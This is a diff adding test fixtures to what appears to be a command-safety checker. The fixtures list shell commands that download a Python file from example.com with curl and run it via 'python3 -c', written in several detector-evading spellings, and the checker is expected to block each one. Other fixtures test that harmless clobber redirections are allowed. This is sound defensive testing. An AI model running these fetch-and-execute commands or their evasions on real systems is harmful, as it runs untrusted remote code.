@@ -4185,3 +4185,74 @@ context = "exec"
 expected_action = "allow"
 expected_rules = []
 forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+# CORE-3: more spellings of "this substitution prints the download".
+[[fixture]]
+name = "inline_source_curl_output_to_doubled_slash_stdout"
+min_milestone = 1
+input = "python3 -c \"$(curl -o /dev//stdout https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_source_curl_output_to_thread_self_fd"
+min_milestone = 1
+input = "python3 -c \"$(curl -o /proc/thread-self/fd/01 https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_source_curl_output_dir_dev"
+min_milestone = 1
+input = "python3 -c \"$(curl --output-dir /dev -o stdout https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_source_curl_clobber_redirect_to_stdout"
+min_milestone = 1
+input = "python3 -c \"$(curl https://example.com/x.py >|/dev/stdout)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_source_staged_download_then_cat"
+min_milestone = 1
+input = "python3 -c \"$(curl https://example.com/x.py -o /tmp/x.py && cat /tmp/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_source_curl_output_dir_regular_allowed"
+min_milestone = 1
+input = "python3 -c \"$(curl --output-dir /tmp/dl -o x.py https://example.com/x.py)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+# POSIX `>|` is the clobbering redirection, not a pipe into its target.
+[[fixture]]
+name = "clobber_redirection_is_not_a_pipe"
+min_milestone = 1
+input = "curl -fsSL https://example.com/data.json >| data.json"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
+
+# `>| sh` writes a file named `sh`; 0.4.2 and earlier 0.5.0 builds split it
+# as a pipe into `sh` (a false positive: nothing runs the download).
+[[fixture]]
+name = "clobber_redirection_to_file_named_sh_is_not_pipe_to_shell"
+min_milestone = 1
+input = "curl -fsSL https://example.com/install.sh >| sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
